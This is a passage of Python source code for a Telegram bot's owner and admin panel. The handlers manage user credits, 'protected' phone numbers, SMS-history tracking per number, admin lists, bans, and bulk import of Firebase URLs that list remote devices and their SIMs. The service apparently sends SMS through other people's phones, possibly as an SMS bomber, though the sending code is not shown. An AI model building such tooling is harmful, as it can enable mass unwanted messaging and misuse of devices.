    d.setdefault("protected_numbers", {})[number] = uid
    sync_runtime_state(d)
    log_activity(d, "number_protected", uid, f"Protected {number}")
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_LOCK, '🔒')} <b>Number Protected!</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <code>{esc(number)}</code>\n"
        f"{em(EMOJI_CROWN, '👤')} Protected by: <code>{uid}</code>",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML",
    )


@R.callback_query(F.data == "owner:protected_list")
async def owner_protected_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_admin(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True)
        return
    protected = d.get("protected_numbers", {})
    if not protected:
        await cq.message.edit_text(
            f"{em(EMOJI_LOCK, '🔐')} <b>Protected Numbers List</b>\n\n{em(EMOJI_CROSS, '❌')} <i>Koi number protected nahi hai.</i>",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML",
        )
        return
    lines = [f"{em(EMOJI_LOCK, '🔐')} <b>Protected Numbers List</b>\n\n"]
    is_owner_user = is_owner(uid, d) or is_main_owner(uid)
    for number, protector_uid in protected.items():
        display_number = number if is_owner_user else mask_number(number)
        protector_name = esc(d.get("users", {}).get(str(protector_uid), {}).get("name", "Unknown"))
        lines.append(
            f"{em(EMOJI_PHONE, '📞')} <code>{esc(display_number)}</code>\n"
            f"   {em(EMOJI_LOCK, '🔒')} Protected by: <code>{protector_uid}</code> ({protector_name})\n"
        )
    rows = []
    if is_owner_user:
        rows.append([btn("ʀᴇᴍᴏᴠᴇ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ", "owner:protected_remove", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")


@R.callback_query(F.data == "owner:protected_remove")
async def owner_protected_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_main_owner(uid):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    protected = d.get("protected_numbers", {})
    if not protected:
        await cq.answer("❌ Koi protected number nahi hai!", show_alert=True)
        return
    rows = [[btn(num, f"owner:protected_del:{num}", EMOJI_CROSS, "🗑", style="danger")] for num in protected]
    rows.append([btn("ʙᴀᴄᴋ", "owner:protected_list", EMOJI_GEAR, "🔙", style="primary")])
    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🗑')} <b>Remove Protected Number</b>\n\nKaunsa number protection hataana hai?",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML",
    )


@R.callback_query(F.data.startswith("owner:protected_del:"))
async def owner_protected_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_main_owner(uid):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    number = cq.data.split("owner:protected_del:", 1)[1]
    if number in d.get("protected_numbers", {}):
        del d["protected_numbers"][number]
        sync_runtime_state(d)
        save(d)
        await cq.answer(f"✅ Protection removed for {number}!", show_alert=True)
    else:
        await cq.answer("❌ Number not found!", show_alert=True)
    await owner_protected_list(cq, state)


@R.callback_query(F.data == "owner:track")
async def owner_track_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.track_number)
    await cq.message.edit_text(
        f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\nJis number ki tracking karni hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML",
    )


@R.message(S.track_number)
async def owner_track_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    number = (msg.text or "").strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return
    await state.clear()
    users_who_sent = []
    for uid_str, history_list in d.get("sms_history", {}).items():
        for entry in history_list:
            if entry.get("number") == number:
                user_data = d.get("users", {}).get(uid_str, {})
                users_who_sent.append(
                    {"uid": int(uid_str), "name": user_data.get("name", "Unknown"), "timestamp": entry.get("timestamp", 0)}
                )
                break
    if not users_who_sent:
        await msg.answer(
            f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\n{em(EMOJI_PHONE, '📞')} <code>{esc(number)}</code>\n\n{em(EMOJI_CROSS, '❌')} <i>Is number pe kisi ne SMS nahi bheja abhi tak.</i>",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML",
        )
        return
    lines = [f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\n{em(EMOJI_PHONE, '📞')} <code>{esc(number)}</code>\n\n<b>Users who sent:</b>\n"]
    for entry in users_who_sent:
        lines.append(f"• <code>{entry['uid']}</code> — {esc(entry['name'][:20])} — {fmt_time(entry['timestamp'])}")
    await msg.answer("\n".join(lines), reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")


@R.callback_query(F.data == "owner:add_all_credits")
async def owner_add_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.add_all_credits_amount)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Add Credits to ALL Users</b>\n\nKitne credits sabhi users ko dena hai?\n<i>Example: 10</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML",
    )


@R.message(S.add_all_credits_amount)
async def owner_add_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    try:
        amount = int((msg.text or "").strip())
        if amount <= 0:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return
    await state.clear()
    users = d.get("users", {})
    if not users:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Koi user nahi hai!", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
        return
    count = 0
    for uid_str in users:
        add_credits(int(uid_str), amount, d)
        count += 1
    log_activity(d, "add_credits_all", uid, f"Added {amount} credits to {count} users")
    save(d)

    notification = (
        f"{em(EMOJI_MONEY, '💰')} <b>Credits Added!</b>\n\n"
        f"{em(EMOJI_GIFT, '🎉')} Aapko <b>{amount}</b> credits mile hain!\n"
        f"{em(EMOJI_MONEY, '💳')} <b>New Balance:</b> Check karein /start"
    )
    success = 0
    for uid_str in users:
        try:
            await msg.bot.send_message(int(uid_str), notification, parse_mode="HTML")
            success += 1
            await asyncio.sleep(0.04)
        except Exception:
            pass

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Credits Added to All Users!</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} {amount} credits each\n"
        f"{em(EMOJI_STAR, '👥')} Total users: <b>{count}</b>\n"
        f"{em(EMOJI_BELL, '📨')} Notified: <b>{success}</b> users",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML",
    )


@R.callback_query(F.data == "owner:deduct_all_credits")
async def owner_deduct_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.deduct_all_credits_amount)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits from ALL Users</b>\n\nKitne credits sabhi users se katne hain?\n<i>Example: 5</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML",
    )


@R.message(S.deduct_all_credits_amount)
async def owner_deduct_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    try:
        amount = int((msg.text or "").strip())
        if amount <= 0:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return
    await state.clear()
    users = d.get("users", {})
    if not users:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Koi user nahi hai!", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
        return
    count = 0
    total_deducted = 0
    owners = d.get("owners", [MAIN_OWNER])
    admins = d.get("admins", [])
    for uid_str, udata in users.items():
        user_id = int(uid_str)
        if user_id in owners or user_id in admins:
            continue
        current = udata.get("credits", 0)
        if current >= amount:
            udata["credits"] = current - amount
            count += 1
            total_deducted += amount
        elif current > 0:
            udata["credits"] = 0
            count += 1
            total_deducted += current
    log_activity(d, "deduct_credits_all", uid, f"Deducted {total_deducted} credits from {count} users")
    save(d)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Credits Deducted from Users!</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} {amount} credits each deducted\n"
        f"{em(EMOJI_STAR, '👥')} Total users affected: <b>{count}</b>\n"
        f"{em(EMOJI_MONEY, '💳')} Total deducted: <b>{total_deducted}</b>",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML",
    )


@R.callback_query(F.data == "user:transfer")
async def user_transfer_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if is_banned(uid, d):
        await cq.answer("🚫 You are banned!", show_alert=True)
        return
    if not can_use(uid, d):
        await cq.answer("⛔ Access nahi hai!", show_alert=True)
        return
    current_credits = get_user_credits(uid, d)
    if current_credits < 2:
        await cq.answer("❌ Minimum 2 credits chahiye transfer ke liye!", show_alert=True)
        return
    await state.set_state(S.transfer_credits_uid)
    await cq.message.edit_text(
        f"{em(EMOJI_MONEY, '💸')} <b>Transfer Credits</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} Your Credits: <b>{current_credits}</b>\n"
        f"Jis user ko credits dena hai uska <b>User ID</b> bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML",
    )


@R.message(S.transfer_credits_uid)
async def user_transfer_uid(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        target_uid = int((msg.text or "").strip())
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid User ID bhejo (numbers only):", parse_mode="HTML")
        return
    if target_uid == uid:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Apne aap ko transfer nahi kar sakte!", parse_mode="HTML")
        return
    if str(target_uid) not in d.get("users", {}):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} User ID exist nahi karta!", parse_mode="HTML")
        return
    current_credits = get_user_credits(uid, d)
    if current_credits < 2:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Minimum 2 credits chahiye!", parse_mode="HTML")
        return
    await state.update_data(transfer_target=target_uid)
    await state.set_state(S.transfer_credits_amount)
    half = current_credits // 2
    await msg.answer(
        f"{em(EMOJI_MONEY, '💸')} <b>{sc('step 2/2')} — {sc('amount')}</b>\n\n"
        f"{em(EMOJI_STAR, '👤')} Target User: <code>{target_uid}</code>\n"
        f"{em(EMOJI_MONEY, '💰')} Your Credits: <b>{current_credits}</b>\n"
        f"{em(EMOJI_ROCKET, '📤')} Max Transfer (Half): <b>{half}</b>\n\n"
        f"Kitne credits transfer karne hain? (Max {half})",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML",
    )


@R.message(S.transfer_credits_amount)
async def user_transfer_amount(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        amount = int((msg.text or "").strip())
        if amount <= 0:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo:", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    target_uid = fsmd.get("transfer_target")
    current_credits = get_user_credits(uid, d)
    max_transfer = current_credits // 2
    if amount > max_transfer:
        await msg.answer(
            f"{em(EMOJI_CROSS, '❌')} Aap sirf {max_transfer} credits transfer kar sakte hain! (Half of {current_credits})",
            parse_mode="HTML",
        )
        return
    if not deduct_credits(uid, amount, d):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Insufficient credits!", parse_mode="HTML")
        return
    add_credits(target_uid, amount, d)
    log_activity(d, "credit_transfer", uid, f"Transferred {amount} credits to {target_uid}")
    save(d)
    await state.clear()
    try:
        await msg.bot.send_message(
            target_uid,
            f"{em(EMOJI_MONEY, '💸')} <b>Credits Received!</b>\n\n"
            f"{em(EMOJI_STAR, '👤')} Received from: <code>{uid}</code>\n"
            f"{em(EMOJI_MONEY, '💰')} Amount: <b>{amount}</b> credits\n"
            f"{em(EMOJI_MONEY, '💳')} New Balance: <b>{get_user_credits(target_uid, d)}</b>",
            parse_mode="HTML",
        )
    except Exception:
        pass
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Transfer Successful!</b>\n\n"
        f"{em(EMOJI_STAR, '👤')} To: <code>{target_uid}</code>\n"
        f"{em(EMOJI_MONEY, '💰')} Amount: <b>{amount}</b> credits\n"
        f"{em(EMOJI_MONEY, '💳')} Your Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([(f"{sc('home')}", "user:home")]),
        parse_mode="HTML",
    )


@R.callback_query(F.data.in_({"owner:home", "owner:refresh"}))
async def owner_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest:
        pass


@R.callback_query(F.data.startswith("owner:fb:menu"))
async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.clear()
    parts = cq.data.split(":")
    page = int(parts[3]) if len(parts) > 3 else 0
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d.get('firebases', []))}</b> firebase(s)",
        reply_markup=fb_menu_kb(d, page),
        parse_mode="HTML",
    )


@R.callback_query(F.data == "owner:fb:add")
async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_firebase)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Add Single Firebase</b>\n\nFirebase URL bhejo:\n"
        f"<i>Format: Label | URL\nExample: MyApp | https://myapp.firebaseio.com</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]),
        parse_mode="HTML",
    )


@R.message(S.add_firebase)
async def owner_fb_add_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    text = (msg.text or "").strip()
    if "|" in text:
        parts = text.split("|", 1)
        label = parts[0].strip()
        url = parts[1].strip()
    else:
        url = text
        label = url.replace("https://", "").split(".")[0][:20]
    if not url.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} URL must start with https://. Dobara bhejo:", parse_mode="HTML")
        return
    url = url.rstrip("/")
    fbs = d.get("firebases", [])
    if any(fb["url"] == url for fb in fbs):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already added!", reply_markup=fb_menu_kb(d), parse_mode="HTML")
        return
    fb_id = str(int(time.time()))
    fbs.append({"id": fb_id, "url": url, "label": label, "added_at": int(time.time())})
    d["firebases"] = fbs
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Firebase Added!</b>\n\n{em(EMOJI_STAR, '🏷')} {esc(label)}\n{em(EMOJI_GEAR, '🔗')} <code>{esc(url)}</code>",
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML",
    )


@R.callback_query(F.data == "owner:fb:add_file")
async def owner_fb_add_file_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_firebase_file)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Bulk Add Firebase via TXT File</b>\n\n"
        f"Aap ek <code>.txt</code> file upload karein jisme Firebase URLs hon.",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu:0")]),
        parse_mode="HTML",
    )


@R.message(S.add_firebase_file, F.document)
async def owner_fb_add_file_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    doc = msg.document
    if not (doc.file_name or "").endswith(".txt"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf <code>.txt</code> file bhejiyega!", parse_mode="HTML")
        return
    file_info = await msg.bot.get_file(doc.file_id)
    downloaded_file = await msg.bot.download_file(file_info.file_path)
    content = downloaded_file.read().decode("utf-8", errors="ignore")
    fbs = d.get("firebases", [])
    existing_urls = {fb["url"].rstrip("/") for fb in fbs}
    added_count = 0
    skipped_count = 0
    processed_in_file = set()

    for line in content.splitlines():
        line = line.strip()
        if not line:
            continue
        if "|" in line:
            parts = line.split("|", 1)
            label = parts[0].strip()
            url = parts[1].strip()
        else:
            url = line
            label = url.replace("https://", "").replace("http://", "").split(".")[0][:20]
        if not (url.startswith("http://") or url.startswith("https://")):
            continue
        url = url.rstrip("/")
        if url in existing_urls or url in processed_in_file:
            skipped_count += 1
            continue
        processed_in_file.add(url)
        existing_urls.add(url)
        fb_id = str(int(time.time() * 1000) + random.randint(100, 999))
        fbs.append({"id": fb_id, "url": url, "label": label, "added_at": int(time.time())})
        added_count += 1

    d["firebases"] = fbs
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Firebase TXT Processed!</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Successfully Added : <b>{added_count}</b>\n"
        f"{em(EMOJI_WARNING, '⚠️')} Skipped (Duplicates) : <b>{skipped_count}</b>\n"
        f"{em(EMOJI_STAR, '📊')} Total Firebase DBs  : <b>{len(fbs)}</b>",
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML",
    )


@R.message(S.add_firebase_file)
async def owner_fb_add_file_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Kripya ek valid <code>.txt</code> document file upload karein!", parse_mode="HTML")


@R.callback_query(F.data.startswith("owner:fb:del:"))
async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    parts = cq.data.split(":")
    fb_id = parts[3]
    page = int(parts[4]) if len(parts) > 4 else 0
    d["firebases"] = [fb for fb in d["firebases"] if fb["id"] != fb_id]
    save(d)
    async with CACHE_LOCK:
        global CACHED_DEVICES
        CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") != fb_id]
    FB_DEVICE_COUNTS.pop(fb_id, None)
    await cq.answer("🗑 Removed!")
    d = load()
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d['firebases'])}</b>",
        reply_markup=fb_menu_kb(d, page),
        parse_mode="HTML",
    )


@R.callback_query(F.data == "owner:stats")
async def owner_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.answer("⏳ Fetching...")
    devices = await get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)
    stats_text = api_stats_text(d)
    dev_lines = [f"\n{em(EMOJI_CHECK, '🟢')} <b>Online Devices ({len(devices)})</b>\n"]
    if not devices:
        dev_lines.append(f"  {em(EMOJI_WARNING, '😴')} Koi device online nahi")
    for dv in devices:
        dev_lines.append(
            f"  {em(EMOJI_PHONE, '📱')} <b>{esc(dv['dev_name'][:20])}</b>\n"
            f"     {em(EMOJI_FIRE, '🔥')} {esc(dv['fb_label'][:25])}\n"
            f"     {em(EMOJI_STAR, '📶')} SIMs: {len(dv['sims']) or 1}"
        )
    full = stats_text + "\n" + "\n".join(dev_lines)
    if len(full) > 4000:
        full = full[:3990] + "\n<i>...truncated</i>"
    await cq.message.edit_text(
        full,
        reply_markup=kb([(f"{sc('refresh')}", "owner:stats"), (f"{sc('back')}", "owner:home")]),
        parse_mode="HTML",
    )


@R.callback_query(F.data == "owner:owners:menu")
async def owner_owners_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Super Admins</b>\n\nTotal: <b>{len(d.get('owners', []))}/6</b>",
        reply_markup=owners_menu_kb(d),
        parse_mode="HTML",
    )


@R.callback_query(F.data == "owner:owners:add")
async def owner_owners_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    if len(d.get("owners", [])) >= 6:
        await cq.answer("❌ Max 6!", show_alert=True)
        return
    await state.set_state(S.add_owner)
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Add Super Admin</b>\n\nSuper Admin Chat ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:owners:menu")]),
        parse_mode="HTML",
    )


@R.message(S.add_owner)
async def owner_owners_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        new_id = int((msg.text or "").strip())
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid Chat ID bhejo.", parse_mode="HTML")
        return
    if is_owner(new_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already super admin!", reply_markup=owners_menu_kb(d), parse_mode="HTML")
        return
    if len(d.get("owners", [])) >= 6:
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Max 6!", reply_markup=owners_menu_kb(d), parse_mode="HTML")
        return
    d["owners"].append(new_id)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Super Admin Added!</b>\n<code>{new_id}</code>",
        reply_markup=owners_menu_kb(load()),
        parse_mode="HTML",
    )


@R.callback_query(F.data.startswith("owner:owners:del:"))
async def owner_owners_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    del_id = int(cq.data.split("owner:owners:del:", 1)[1])
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    if del_id == MAIN_OWNER or del_id in SUPER_ADMINS:
        await cq.answer("❌ Main owner remove nahi ho sakta!", show_alert=True)
        return
    if del_id in d["owners"]:
        d["owners"].remove(del_id)
        save(d)
        await cq.answer("🗑 Removed!")
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Owners</b>\n\nTotal: <b>{len(d['owners'])}/6</b>",
        reply_markup=owners_menu_kb(d),
        parse_mode="HTML",
    )


@R.callback_query(F.data == "owner:admins:menu")
async def owner_admins_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>\n\nTotal: <b>{len(d.get('admins', []))}</b>",
        reply_markup=admins_menu_kb(d),
        parse_mode="HTML",
    )


@R.callback_query(F.data == "owner:admins:add")
async def owner_admins_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_admin)
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Add Admin</b>\n\nTelegram User ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:admins:menu")]),
        parse_mode="HTML",
    )


@R.message(S.add_admin)
async def owner_admins_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        new_id = int((msg.text or "").strip())
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    if new_id in d.get("admins", []) or is_owner(new_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already admin/owner!", reply_markup=admins_menu_kb(d), parse_mode="HTML")
        return
    d["admins"].append(new_id)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Admin Added!</b>\n<code>{new_id}</code>",
        reply_markup=admins_menu_kb(load()),
        parse_mode="HTML",
    )


@R.callback_query(F.data.startswith("owner:admins:del:"))
async def owner_admins_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    del_id = int(cq.data.split("owner:admins:del:", 1)[1])
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    if del_id in d.get("admins", []):
        d["admins"].remove(del_id)
        save(d)
        await cq.answer("🗑 Removed!")
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admins</b>\n\nTotal: <b>{len(d['admins'])}</b>",
        reply_markup=admins_menu_kb(d),
        parse_mode="HTML",
    )


@R.callback_query(F.data.in_({"owner:free:on", "owner:free:off"}))
async def owner_free_toggle(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    d["free_mode"] = cq.data == "owner:free:on"
    save(d)
    d = load()
    mode = "🟢 FREE MODE ON" if d["free_mode"] else "🔴 Approval Required"
    await cq.answer(f"Done! {mode}", show_alert=True)
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest:
        pass


@R.callback_query(F.data.in_({"owner:users:list", "admin:users:list"}))
async def panel_users_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    prefix = "owner" if is_owner(uid, d) else "admin"
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    text, markup = users_list_kb(d, prefix, 0)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")


@R.callback_query(F.data.regexp(r"^(owner|admin):users:pg:(\d+)$"))
async def panel_users_page(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    parts = cq.data.split(":")
    text, markup = users_list_kb(d, parts[0], int(parts[3]))
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")


@R.callback_query(F.data.in_({"owner:ban", "admin:ban"}))
async def panel_ban_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.ban_user)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(
        f"{em(EMOJI_CROSS, '🚫')} <b>Ban User</b>\n\nUser ka Telegram ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", back)]),
        parse_mode="HTML",
    )


@R.message(S.ban_user)
async def panel_ban_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    try:
        ban_id = int((msg.text or "").strip())
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    if is_owner(ban_id, d) or is_admin(ban_id, d):
        await state.clear()
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Admin/Owner ko ban nahi kar sakte!", parse_mode="HTML")
        return
    if ban_id not in d.get("banned", []):
        d.setdefault("banned", []).append(ban_id)
        save(d)
    await state.clear()
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Ban ho gaya!</b>\n<code>{ban_id}</code>", reply_markup=back_kb, parse_mode="HTML")


@R.callback_query(F.data.in_({"owner:unban:menu", "admin:unban:menu"}))
async def panel_unban_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    banned = d.get("banned", [])
    if not banned:
        await cq.answer("✅ Koi banned nahi!", show_alert=True)
        return
    prefix = "owner" if is_owner(cq.from_user.id, d) else "admin"
    await cq.message.edit_text(
        f"{em(EMOJI_CHECK, '🔓')} <b>Unban User</b>\n\nBanned: <b>{len(banned)}</b>",
        reply_markup=unban_menu_kb(d, prefix),
        parse_mode="HTML",
    )


@R.callback_query(F.data.regexp(r"^(owner|admin):unban:do:(\d+)$"))
async def panel_unban_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
